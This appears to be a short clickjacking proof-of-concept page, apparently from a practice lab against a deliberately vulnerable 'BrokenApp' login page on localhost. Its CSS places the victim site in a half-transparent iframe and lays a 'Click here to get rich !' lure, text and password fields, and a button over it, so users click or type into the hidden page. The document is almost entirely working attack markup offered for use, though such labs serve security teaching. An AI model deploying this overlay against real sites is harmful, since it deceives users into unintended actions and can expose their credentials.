<style>
iframe { /* iframe from the victim site */
	width: 1000px;
	height: 700px;
	position: absolute;
	top:0;
	opacity: 0.5; /* in fake opacity:0.5 */
	z-index: 1;    }
h1 {
	position: absolute;
	left: 50px;
	top: 100px;    }

input[type=text] {
	position: absolute;
	left: 80px;
	top: 200px;    }
	
input[type=password] {
	position: absolute;
	left: 80px;
	top: 280px;    }
	
button {
	position: absolute;
	left: 80px;
	top: 350px;    }	

</style>

<!-- The url from the victim site -->
<iframe src="http://127.0.0.1/BrokenApp/7-Login/home.php"> </iframe>
<h1> Click here to get rich ! </h1>
<input type="text" name="test1">
<input type="password" name="test2">
<button>Click</button>


